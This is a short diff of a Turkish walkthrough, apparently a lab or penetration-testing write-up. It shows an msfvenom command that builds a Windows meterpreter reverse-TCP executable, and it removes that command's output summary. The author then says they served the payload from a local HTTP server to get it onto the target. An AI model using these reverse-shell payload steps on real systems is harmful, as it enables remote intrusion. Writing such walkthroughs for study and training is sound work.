@@ -153,13 +153,6 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
 
 <img width="1271" height="205" alt="beacon" src="https://github.com/user-attachments/assets/1d8e0618-b5ae-4260-a7a7-1c1372af4043" />
 
-**Çıktı özeti:**
-
-```
-Payload size: 381 bytes
-Final size of exe file: 73802 bytes
-Saved as: shell-name.exe
-```
 
 Payload dosyasını hedefe ulaştırmak için kendi dizinimde basit bir HTTP sunucusu açtım:
 
